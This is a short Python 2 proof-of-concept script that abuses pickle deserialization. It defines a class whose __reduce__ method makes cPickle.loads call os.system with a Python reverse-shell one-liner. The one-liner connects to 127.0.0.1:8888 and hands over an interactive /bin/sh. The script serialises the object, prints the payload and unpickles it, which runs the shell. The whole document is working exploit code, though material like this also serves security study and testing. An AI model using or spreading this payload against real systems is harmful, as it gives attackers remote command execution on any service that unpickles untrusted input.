#coding=utf-8
import cPickle  #底层使用 c 语言书写，速度是pickle 的 1000 倍
import os

class exp(object):
    def __reduce__(self):
        s="""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' """
        return os.system, (s,)

e=exp()
poc = cPickle.dumps(e)
print poc
cPickle.loads(poc)